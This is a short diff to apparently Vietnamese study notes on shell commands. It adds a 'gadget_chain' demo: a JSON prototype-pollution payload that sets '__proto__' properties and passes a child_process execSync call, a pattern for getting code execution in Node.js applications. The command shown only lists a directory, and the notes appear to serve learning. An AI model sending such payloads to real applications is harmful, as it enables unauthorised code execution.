@@ -18,4 +18,10 @@
         6. xuất đường dẫn : pwd
         7. tạo file test.txt với nội dung "hello dev" : echo "hello dev" > test.txt
 3. Demo gadget_chain:
-    
+{
+    "__proto__": {
+        "shell": "node",
+        "execute": true
+    },
+    "args": "console.log(require('child_process').execSync('dir').toString())"
+}
